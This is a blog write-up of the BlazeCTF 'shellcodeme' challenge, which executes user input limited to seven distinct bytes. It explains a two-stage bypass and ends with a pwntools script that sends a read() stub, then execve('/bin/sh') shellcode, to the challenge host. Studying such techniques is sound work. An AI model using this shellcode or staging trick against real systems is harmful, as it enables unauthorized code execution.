---
layout: post
title: "BlazeCTF writeup — shellcodeme"
date: 2018-04-26 06:23:17 +0000
categories: blog
---

### BlazeCTF writeup — shellcodeme

This challenge is interesting and kinda familiar...

Looking at its source code:

```
int main() {    setbuf(stdout, NULL);    unsigned char seen[257], *p, *buf;    void (*f)(void);    int i;    memset(seen, 0, sizeof seen);    buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    puts("Shellcode?");    fgets(buf, BUF_SIZE, stdin);    for(p=buf; *p != '\n'; p++) {        seen[256] += !seen[*p];        seen[*p] |= 1;    }    if(seen[256] > 7) {        puts("Shellcode too diverse.");        _exit(1);    } else {        *(void**)(&f) = (void*)buf;        f();        _exit(0);    }}
```

If you play CTF’s before, it should not be strange to you. It directly asks for a shellcode, in binary form, but enforces a strict check on the shellcode itself. In this case, it checks for the diversity of instructions’ opcode…

What does it mean? Reading the source code, it actually means we can’t have more than 7 distinct bytes in our whole shellcode binary! This is somehow harder than length limitation, because we can pick instructions based on length, but for diversity it is harder to pick… A shorter instruction doesn’t necessarily contribute less to overall diversity: for example, if we repeat a same instruction for many times, the overall diversity doesn’t change at all… So, it is more complicated to control the final diversity of our shellcode.

What’s more important, is it even possible to reduce any shellcode’s diversity down to 7? Looking at the shortest one I can find from Google: https://www.exploit-db.com/exploits/36858/ , 23 bytes, its diversity is surely much larger than 7… Is it possible to reduce it down to 7? I seriously doubt, at least my x86 assembly skill is far from good enough to challenge it.

Yeah, it is easy to think of the brilliant movfuscator, we get the idea but even with only mov’s we still can’t reduce it down to 7, because x86 mov’s opcodes are so different too.

So… is there any way to bypass it? My first thought is to overflow seen[256] to bypass seen[256]>7 check. But it is impossible, because there is always one character missing from this ASCII table (seen[]), that is “\n”. fgets() always consumes it, therefore the most we get is 255 which is not yet overflowed. Sigh…

```
seen[256]
```

```
seen[256]>7
```

```
fgets()
```

It is nearly impossible to write shellcode directly to meet this requirement. What other way we can think of? What if we can read more? What about reading more instructions and then loading our real shellcode in the second input? Sounds doable… Let’s divide it to 4 steps:

Obviously we still have to pass the diversity check in step 1), but now it is much easier since read(STDIN) is much simpler than execve().

Let’s start with a quick and simple version:

```
xor rdi, rdi
```

```
xor rax, raxmov rsi, Xmov rdx, Ysyscall
```

Before we check the diversity, we need to figure out X and Y.

X is the buffer which we want to read our real shellcode into. Because we have no control of the code flow yet, so have to choose $rip after syscall as the buffer. Fortunately, $rbp already points to our first instruction here, as call rbp tells us. If we want exactly the $rip after syscall, we have to do an additional operation, that is, adding some offset to $rbp. Thinking it more, we can safely put $rbp here as we can pad with nop until we reach after syscall.

```
syscall
```

```
call rbp
```

```
syscall
```

```
nop
```

```
syscall
```

Y is the number of bytes we could read into, at least larger than 23 which is the minimum shellcode I can find online. To reduce the diversity, we can pick 0x48 temporarily:

```
%  rasm2 -b64 'xor rax, rax; xor rdi, rdi; mov rsi, rbp; mov rdx, 0x48; syscall'4831c04831ff4889ee48c7c2480000000f05
```

its diversity is still 11, larger than 7 but very close now!

How can we reduce it even more? Is there anything we can reuse? Yes, in fact we can reuse its context, that is the registers at the time we execute the call rbp. Notice that, $rdi is already 0, and $rbx=0x400 is a fairly good candidate for the above Y… To further reduce the diversity we want to use as many similar instructions as possible, finally I get:

```
call rbp
```

```
% rasm2 -b64 'mov rdx, rbx; mov rax, rdi; mov rsi,rbp; syscall'4889da4889f84889ee0f05
```

And the complete solution is:

```
#!/usr/bin/env python
```

```
from pwn import *
```

```
context.log_level = 'debug'
```

```
r = remote("shellcodeme.420blaze.in", 420)r.recvline()# rasm2 -b64 'mov rdx, rbx; mov rax, rdi; mov rsi,rbp; syscall'r.sendline('\x48\x89\xda\x48\x89\xf8\x48\x89\xee\x0f\x05\x0a')r.sendline('\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')r.interactive()r.close()
```

(The binary in this challenge has been changed after I solved it, so you can’t just use the above shellcode with the latest binary.)